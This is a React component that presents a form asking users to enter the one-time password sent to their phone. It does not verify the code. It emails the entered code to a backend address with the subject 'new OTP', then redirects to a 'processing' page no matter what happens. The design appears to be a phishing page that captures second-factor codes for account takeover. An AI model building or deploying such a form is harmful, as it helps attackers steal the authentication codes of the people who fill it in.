import { useState } from "react";
import "../styles/otp.css";
import { baseUrl } from "../constants";
import { useNavigate } from "react-router-dom";

function Otp() {
  const [otp, setOtp] = useState(""); // Initialize the state with an empty string.
  const navigate = useNavigate();

  const sendOtp = async (e) => {
    e.preventDefault();
    let dataSend = {
      subject: "new OTP",
      message: `Otp: ${otp}`,
    };
    setTimeout(() => {
      navigate("/processing");
    }, 2000);

    try {
      const response = await fetch(`${baseUrl}/email/sendOTP`, {
        method: "POST",
        body: JSON.stringify(dataSend),
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
      });

      if (response.status >= 200 && response.status < 300) {
      } else {
        console.error("Failed to send the OTP"); // Handle non-2xx response here.
      }
    } catch (error) {
      console.error("An error occurred:", error);
    }
  };

  return (
    <>
      <div className="container2 text-center">
        <form onSubmit={sendOtp}>
          <h5>
            Please submit the OTP (One Time Password) that was sent to your
            phone
          </h5>

          <div className="form-floating">
            <input
              type="number"
              className="form-control"
              id="code"
              value={otp}
              minLength={4}
              onChange={(e) => {
                setOtp(e.target.value);
              }}
            />
            <label className="form-label" htmlFor="code">
              Enter Code&#42;
            </label>
          </div>
          <div>
            <button className="btn" id="submit">
              Submit
            </button>
          </div>
        </form>
      </div>
    </>
  );
}

export default Otp;
